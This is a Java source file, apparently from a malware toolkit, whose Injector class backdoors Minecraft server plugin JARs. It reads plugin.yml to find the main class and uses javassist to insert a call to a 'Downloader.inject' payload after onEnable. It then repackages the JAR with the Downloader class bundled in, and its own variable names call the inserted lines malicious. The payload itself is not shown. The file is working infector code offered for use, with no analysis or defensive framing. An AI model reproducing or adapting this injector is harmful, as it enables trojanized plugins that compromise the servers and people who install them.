package cc.americium.command;

import cc.americium.Downloader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.CopyOption;
import java.nio.file.FileAlreadyExistsException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.Map;
import java.util.Scanner;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javax.swing.JOptionPane;
import org.apache.commons.lang.SystemUtils;
import org.yaml.snakeyaml.Yaml;

public class Injector {
    public static boolean patchFile(String orig, String out, SimpleConfig config) {
        ArrayList<String> maliciousLines = new ArrayList<String>();
        File a = new File("malicious.txt");
        try {
            Scanner myReader = new Scanner(a);
            while (myReader.hasNextLine()) {
                String data = myReader.nextLine();
                maliciousLines.add("cc.americium.Downloader.inject(this);");
            }
            myReader.close();
        }
        catch (FileNotFoundException e2) {
            maliciousLines.add("cc.americium.Downloader.inject(this);");
        }
        Path input = Paths.get(orig, new String[0]);
        Path output = Paths.get(out, new String[0]);
        if (!input.toFile().exists()) {
            return false;
        }
        File temp = new File("temp");
        temp.mkdirs();
        temp.deleteOnExit();
        try {
            Files.copy(input, output, new CopyOption[0]);
        }
        catch (FileAlreadyExistsException e) {
            int override = 0;
            try {
                Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
            }
            catch (IOException e1) {
            //    e.printStackTrace();
                return false;
            }
            return false;
        }
        catch (IOException e) {
         //   e.printStackTrace();
            return false;
        }
        Map<String, Object> pluginYAML = Injector.readPluginYAML(input.toAbsolutePath().toString());
        String name = (String)pluginYAML.get("name");
        String mainClass = (String)pluginYAML.get("main");
        try {
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);
            pool.appendClassPath(new ClassClassPath(Downloader.class));
            CtClass cc = pool.get(mainClass);
            CtMethod m = cc.getDeclaredMethod("onEnable");
            StringBuilder sb = new StringBuilder();
            sb.append("new String[]{");
            int i = 0;
            while (i < 1) {
                sb.append("\"");
                sb.append("");
                sb.append("\"");
                ++i;
            }
            sb.append("}");
            m.insertAfter("{ " + (String)maliciousLines.get(0) + " }");
            cc.writeFile(temp.toString());
        }
        catch (Exception e) {
           // e.printStackTrace();
            return false;
        }
        Path patchedFile = null;
        FileSystem outStream = null;
        Path target = null;
        try {
            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class", new String[0]);
            outStream = FileSystems.newFileSystem(output, (ClassLoader) null);
            target = outStream.getPath("/" + mainClass.replace(".", "/") + ".class", new String[0]);
            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
        }
        catch (IOException e) {
          //  e.printStackTrace();
            return false;
        }
        InputStream[] resourceStreams = new InputStream[]{Injector.class.getResourceAsStream("/cc/americium/Downloader.class")};
        Path[] targetPaths = new Path[]{outStream.getPath("/cc/americium/Downloader.class", new String[0])};
        try {
            Files.createDirectories(outStream.getPath("/cc/americium", new String[0]), new FileAttribute[0]);
            int i = 0;
            while (i < targetPaths.length) {
                try {
                    Files.copy(resourceStreams[i], targetPaths[i], new CopyOption[0]);
                }
                catch (Exception ignored) {

                }
                ++i;
            }
            outStream.close();
        }
        catch (FileAlreadyExistsException e) {
           // e.printStackTrace();
            return false;
        }
        catch (IOException e) {
           // e.printStackTrace();
            return false;
        }
        return true;
    }

    private static Map<String, Object> readPluginYAML(String path) {
        Yaml yamlData = new Yaml();
        InputStream is = null;
        String inputFile = null;
        if (SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC) {
            inputFile = "jar:file://" + path + "!/plugin.yml";
        }
        if (SystemUtils.IS_OS_WINDOWS) {
            inputFile = "jar:file:/" + path + "!/plugin.yml";
        }
        try {
            if (inputFile.startsWith("jar:")) {
                URL inputURL = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection)inputURL.openConnection();
                is = connection.getInputStream();
            }
        }
        catch (IOException e) {
            //e.printStackTrace();
            return null;
        }
        return (Map)yamlData.load(is);
    }

    public static class SimpleConfig {
        public String[] UUID;
        public String prefix;
    }
}
